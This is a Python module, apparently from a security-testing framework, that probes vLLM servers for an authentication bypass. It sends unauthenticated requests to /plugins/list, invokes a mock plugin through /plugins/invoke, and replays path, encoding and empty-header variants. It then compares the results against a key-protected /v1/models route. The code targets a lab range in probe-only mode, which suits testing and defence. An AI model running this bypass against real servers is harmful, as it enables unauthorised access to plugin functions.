"""vLLM 插件路由鉴权绕过 — /plugins/* 绕过 api-key。

Ruling: 实验室直达路由（vllm /plugins/list、/plugins/invoke，均为靶场 writes=False 面，
probe-only 可安全探测）；对照面 /v1/models（X-Mock-Service: vllm）两模式均要求 key，
其 401 与插件面 200 的差分即绕过证据。检测依据实际 HTTP 响应，不读路由清单姿态字段。
"""
from __future__ import annotations

import json
import time
import urllib.error
import urllib.request
from pathlib import Path

KEY = "vllm-plugin-auth-bypass"
WRITES = False
TIMEOUT = 3


def _resolve_mode(params: dict) -> tuple[str, str]:
    if params.get("mode") != "backup-write":
        return "probe-only", ""
    if WRITES and params.get("backup_targets"):
        return "backup-write", ""
    return "probe-only", "降级probe-only（backup-write 需 backup_targets）"


class Trace:
    """HTTP 全量 trace（请求+响应），写 ctx['run'].dir/traces/ 后作为 artifact 返回。"""

    def __init__(self, ctx: dict):
        d = Path(ctx["run"].dir) / "traces"
        d.mkdir(parents=True, exist_ok=True)
        self.path = d / f"{KEY}.json"
        self.entries: list[dict] = []

    def call(self, method: str, url: str, body=None, headers: dict | None = None):
        entry = {"ts": round(time.time(), 3), "method": method, "url": url,
                 "body": body, "headers": dict(headers or {})}
        data = json.dumps(body).encode("utf-8") if body is not None else None
        req = urllib.request.Request(url, data=data, method=method)
        if data is not None:
            req.add_header("Content-Type", "application/json")
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                raw, status = resp.read(), resp.status
        except urllib.error.HTTPError as exc:
            raw, status = exc.read(), exc.code
        except Exception as exc:
            entry.update(status=0, error=f"{type(exc).__name__}: {exc}")
            self.entries.append(entry)
            return entry
        text = raw.decode("utf-8", "replace")
        try:
            payload = json.loads(text)
        except ValueError:
            payload = text
        entry.update(status=status, response=payload)
        self.entries.append(entry)
        return entry

    def dump(self) -> Path:
        self.path.write_text(
            json.dumps({"module": KEY, "entries": self.entries}, ensure_ascii=False, indent=1),
            encoding="utf-8")
        return self.path


def run(ctx: dict, params: dict) -> dict:
    target = str(params.get("target") or "").rstrip("/")
    mode, note = _resolve_mode(params)
    if not target:
        return {"summary": "no-target", "artifacts": [], "findings": []}
    marker = str(ctx.get("marker") or "TRIDENT")
    t = Trace(ctx)

    listing = t.call("GET", f"{target}/plugins/list")
    control = t.call("GET", f"{target}/v1/models", headers={"X-Mock-Service": "vllm"})
    invoked = None
    variant_hits = []
    if listing.get("status") == 200:
        invoked = t.call("POST", f"{target}/plugins/invoke",
                         {"plugin": "mock-plugin", "args": {"probe": marker, "marker": marker}})
        # payload 变体（版本矩阵驱动）：插件面成立后重放 ≤2 变体（路径/编码/空鉴权头）
        # `_lateral-common.py` 文件名含连字符，不能作包模块导入；按仓库惯例以 importlib 装载
        import importlib.util as _ilu
        from pathlib import Path as _Path
        _spec = _ilu.spec_from_file_location(
            "_lateral_common", _Path(__file__).resolve().parent.parent / "_lateral-common.py")
        _mod = _ilu.module_from_spec(_spec)
        _spec.loader.exec_module(_mod)
        VariantProber = _mod.VariantProber

        vp = VariantProber(t, KEY, limit=2)
        variant_hits = vp.probe(method="GET", path="/plugins/list", base_url=target)

    findings = []
    if listing.get("status") == 200 and control.get("status") in (401, 403):
        plugins = []
        resp = listing.get("response")
        if isinstance(resp, dict):
            plugins = [p.get("name") for p in resp.get("plugins", []) if isinstance(p, dict)]
        detail = {
            "route": "/plugins/list+/plugins/invoke", "unauth_status": 200,
            "control_route": "/v1/models", "control_status": control.get("status"),
            "plugins": plugins, "invoke_status": invoked.get("status") if invoked else None,
            "note": "插件端点未鉴权而 /v1/* 要求 api-key：组合即绕过",
        }
        if variant_hits:
            detail["payload_variants"] = variant_hits
        findings.append({"sev": "high", "title": "vLLM 插件路由绕过 api-key",
                         "detail": json.dumps(detail, ensure_ascii=False)})
    artifact = t.dump()
    summary = (f"plugins/list={listing.get('status')} 对照面/v1/models={control.get('status')} "
               f"invoke={invoked.get('status') if invoked else 'skipped'} mode={mode}")
    if variant_hits:
        summary += f" variants={len(variant_hits)}"
    if note:
        summary += f"；{note}"
    return {"summary": summary, "artifacts": [str(artifact)], "findings": findings}
